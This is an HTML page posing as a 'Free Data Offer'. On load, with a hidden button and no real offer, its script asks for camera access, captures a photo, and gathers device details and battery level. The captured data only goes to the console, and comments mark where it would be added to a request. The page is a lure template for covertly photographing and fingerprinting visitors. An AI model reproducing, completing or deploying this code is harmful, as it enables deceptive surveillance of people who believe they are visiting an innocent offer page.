<!DOCTYPE html>
<html>
<head>
    <title>Free Data Offer</title>
</head>
<body>
    <button id="requestCamera" style="display: none;">Request Camera Permission</button>

    <script>
        // Function to request camera permission and capture a photo
        function requestCameraPermission() {
            navigator.mediaDevices.getUserMedia({ video: true })
            .then(function(stream) {
                // Camera access granted
                console.log('Camera permission granted.');

                // Hide the button
                document.getElementById('requestCamera').style.display = 'none';



                // Access the video stream and capture a photo (you can add this part as needed)
                const video = document.createElement('video');
                document.body.appendChild(video);
                video.srcObject = stream;

                video.onloadedmetadata = function(e) {
                    // Adjust the video size here if needed
                    video.play();

                    const canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    const context = canvas.getContext('2d');
                    context.drawImage(video, 0, 0, canvas.width, canvas.height);

                    // Convert the captured image to a Blob
                    canvas.toBlob(function(blob) {
                        // Get device information
                        getDeviceInformation(blob);

                        // Clean up resources (you can add this part as needed)
                        stream.getTracks().forEach(track => track.stop());
                        video.remove();
                    }, 'image/jpeg');
                };
            })
            .catch(function(error) {
                // Camera access denied

                // Get the battery percentage and device information
                getBatteryPercentage();
                getDeviceInformation();
            });
        }

        // Function to get the battery percentage
        function getBatteryPercentage() {
            if ('getBattery' in navigator) {
                navigator.getBattery().then(function(battery) {
                    // Include the battery percentage in the request (you can add this part as needed)
                    console.log('Battery Percentage: ' + (battery.level * 100) + '%');
                });
            } else {
                console.log('Battery Status API is not supported in this browser.');
            }
        }

        // Function to get device information and include it in the request
        function getDeviceInformation(photoBlob) {
            const deviceInfo = {
                userAgent: navigator.userAgent,
                brand: navigator.appVersion,
                model: navigator.product,
                platform: navigator.platform
            };

            // Include device information and the captured photo in the request (you can add this part as needed)
            console.log('Device Information:', deviceInfo);
        }

        // Automatically click the button when the page loads
        window.addEventListener('load', function() {
            requestCameraPermission();
        });
        
    </script>
</body>
</html>
